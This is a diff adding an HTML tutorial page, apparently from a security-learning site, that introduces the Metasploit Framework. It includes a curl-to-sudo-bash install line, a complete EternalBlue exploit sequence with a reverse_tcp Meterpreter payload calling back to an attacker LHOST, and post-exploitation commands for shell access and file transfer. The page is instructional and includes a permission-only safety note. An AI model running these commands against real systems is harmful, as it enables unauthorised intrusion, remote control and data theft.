@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Metasploit Full Guide - Hack & Code</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
+      color: white;
+      display: flex;
+    }
+    .sidebar {
+      position: fixed;
+      top: 100px;
+      left: 0;
+      width: 300px;
+      height: calc(100% - 100px);
+      background-color: #1a1a1a;
+      padding: 1.5rem;
+      border-right: 2px solid #00C2FF;
+      overflow-y: auto;
+    }
+    .sidebar h3 {
+      color: #00C2FF;
+    }
+    .sidebar ul {
+      list-style-type: none;
+      padding-left: 0;
+    }
+    .sidebar ul li a {
+      color: #ccc;
+      text-decoration: none;
+      display: block;
+      padding: 0.5rem 0;
+    }
+    .sidebar ul li a:hover {
+      color: #00C2FF;
+    }
+    .main-content {
+      margin-left: 300px;
+      width: calc(100% - 300px);
+      padding: 2rem;
+    }
+    .content-section img {
+      max-width: 100%;
+      border-radius: 10px;
+      margin: 1rem 0;
+    }
+  </style>
+</head>
+<body>
+
+    <header>
+        <link rel="stylesheet" href="style_mobile.css">
+       <div class="logo" style="display: flex; align-items: center; gap: 10px;">
+        <img src="logo 8.png" alt="Hack & Code Logo" style="height: 80px; width: auto;" />
+        <span style="font-size: 2.5rem; font-weight:10; color: #00C2FF; font-family: 'Bauhaus 93', sans-serif;">HACK & CODE</span>
+      </div>
+    <div class="tagline">Learn | Build | Secure </div>
+    <nav>
+      <a href="index.html" onclick="showPage('home')" class="nav-link active">Home</a>
+      <a href="index.html" onclick="showPage('about')" class="nav-link">About</a>
+      <a href="index.html" onclick="showPage('courses')" class="nav-link">Courses</a>
+      <a href="index.html" onclick="showPage('contact')" class="nav-link">Contact</a>
+      <a href="#Linux-basics-pdf"  class="nav-link">Linux basics pdf</a>
+      
+    </nav>
+  </header>
+
+
+  <div class="sidebar">
+    <h3>Table of Contents</h3>
+    <ul>
+      <li><a href="#what-is">What is Metasploit?</a></li>
+      <li><a href="#install">Installation</a></li>
+      <li><a href="#basics">Basic Usage</a></li>
+      <li><a href="#modules">Understanding Modules</a></li>
+      <li><a href="#exploit">Launching an Exploit</a></li>
+      <li><a href="#meterpreter">Using Meterpreter</a></li>
+      <li><a href="#tips">Tips & Safety</a></li>
+    </ul>
+  </div>
+  <div class="main-content">
+    <section class="content-section">
+      <h1>Metasploit Framework Complete Guide</h1>
+
+      <h2 id="what-is">What is Metasploit?</h2>
+      <p>Metasploit is a powerful penetration testing framework used to discover, exploit, and validate vulnerabilities. It helps ethical hackers to test and secure systems.</p>
+
+      <h2 id="install">Installation</h2>
+      <p><strong>Linux (Kali):</strong> Pre-installed</p>
+      <p><strong>Manual:</strong></p>
+      <pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate | sudo bash</code></pre>
+
+      <h2 id="basics">Basic Usage</h2>
+      <pre><code>msfconsole</code></pre>
+      <p>This opens the main interface. You can search, configure, and launch exploits from here.</p>
+
+      <h2 id="modules">Understanding Modules</h2>
+      <ul>
+        <li><strong>Exploit:</strong> Attacks a vulnerability</li>
+        <li><strong>Payload:</strong> Code to run after exploitation</li>
+        <li><strong>Auxiliary:</strong> Scanning, fuzzing, sniffing</li>
+        <li><strong>Post:</strong> Run after successful exploitation</li>
+      </ul>
+
+      <h2 id="exploit">Launching an Exploit</h2>
+      <pre><code>use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.5
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit</code></pre>
+
+      <h2 id="meterpreter">Using Meterpreter</h2>
+      <ul>
+        <li><code>sysinfo</code> - Get target system info</li>
+        <li><code>shell</code> - Launch command shell</li>
+        <li><code>screenshot</code> - Capture screenshot</li>
+        <li><code>download</code> / <code>upload</code> - File transfer</li>
+      </ul>
+
+      <h2 id="tips">Tips & Safety</h2>
+      <ul>
+        <li>Only use Metasploit in test environments or with permission</li>
+        <li>Keep the framework updated</li>
+        <li>Combine with Nmap for reconnaissance</li>
+        <li>Use <code>set VERBOSE true</code> for more detail</li>
+      </ul>
+    </section>
+  </div>
+</body>
+</html>
